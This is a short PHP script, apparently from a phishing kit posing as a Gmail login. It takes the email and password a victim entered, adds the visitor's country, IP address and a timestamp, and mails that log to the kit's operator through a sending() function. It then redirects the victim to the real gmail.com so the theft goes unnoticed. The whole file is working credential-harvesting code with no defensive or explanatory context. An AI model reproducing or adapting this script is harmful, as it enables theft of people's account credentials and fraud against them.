<?php
session_start();
define('myPage', TRUE);
require('../.country.inc.php');

date_default_timezone_set("Africa/Lagos");
if(!isset($_SESSION['email']) || $_SESSION['email'] == "" || !isset($_SESSION['pass']) || $_SESSION['pass'] == "") {
	header("Location: viewer.php");
	exit;
}

$email = $_SESSION['email'];
$pass = $_SESSION['pass'];
session_destroy();

$country = visitor_country();
$subject = "V-Gw@!l - ".$country[0];
$log_date = date('d/m/Y - h:i:s');
$ip = getenv("REMOTE_ADDR");

$message .= "-------------- Gw@!l-----------------------\n";
$message .= "Email ID : ".$email."\n";
$message .= "Password : ".$pass."\n";
$message .= "Date : ".$log_date."\n";
$message .= "Country : ".$country[0]."\n";
$message .= "IP: ".$ip."\n";

sending($country,$subject,$message);
sendAttach($email);

header("Location: http://gmail.com");
?>

